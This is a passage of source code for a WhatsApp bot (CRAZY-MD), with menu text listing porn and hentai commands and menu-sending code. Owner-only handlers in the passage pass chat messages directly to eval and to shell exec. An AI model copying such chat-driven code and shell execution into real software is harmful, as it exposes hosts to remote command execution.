‎┃│xᴠɪᴅᴇᴏ❌
‎┃│ɴsғᴡ❌
‎┃│ᴘᴏʀɴ❌
‎┃│ʜᴇɴᴛᴀɪ❌
‎┃╰──
‎┃╰──ll
‎┗━━━━━━━━━━━━━━━━⊱
‎╭━━━〔ɢᴀᴍᴇ-ᴍᴇɴᴜ〕━━━┈⊷
‎┃╭───────=──────
‎┃│ᴛʀᴜᴛʜ
‎┃│ᴅᴇᴀʀ
┃│ғᴀᴄᴛ
‎┃╰──
‎┃╰──ll
‎┗━━━━━━━━━━━━━━━━⊱
‎╭━━〔ᴅᴏᴡɴʟᴏᴀᴅ-ᴍᴇɴᴜ〕━━┈⊷
‎┃╭───────=──────
‎┃│ᴘʟᴀʏ
‎┃│ʏᴛᴍᴘ3
‎┃│ʏᴛᴍᴘ4
‎┃│sᴏᴜɴᴅ1-100
┃│ɪᴍɢ
┃│sᴏɴɢ
┃│ᴍᴇᴅɪᴀғɪʀᴇ
┃│ᴠɪᴅᴇᴏ
┃│ᴄᴏᴜᴘʟᴇᴘᴘ
‎┃╰──
‎┃╰──ll© 2025 | 2099
‎┗━━━━━━━━━━━━━━━━⊱
> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ ᴛᴇᴄʜ
`














if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xeonmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./crazy-core/thumb.jpg'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
      title: `𝐂𝐑𝐀𝐙𝐘-𝐌𝐃 𝐕２`,
      body: `ᴄʜᴜᴅᴅʏ ʙᴜᴅᴅʏ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ 🌟`,
      thumbnailUrl: 'https://files.catbox.moe/cfqz6q.jpeg',
      sourceUrl: `https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C`,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./crazy-core/thumb.jpg'),
                        caption: xeonmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xeonmenuoh
                        }
                    }, {})
                }
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcxeon(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcxeon(bang)
                    }
                    try {
                        replygcxeon(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcxeon(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcxeon(evaled)
                    } catch (err) {
                        await replygcxeon(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcxeon(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcxeon(err)
                        if (stdout) return replygcxeon(stdout)
                    })
                }
        }
    } catch (err) {
        XeonBotInc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})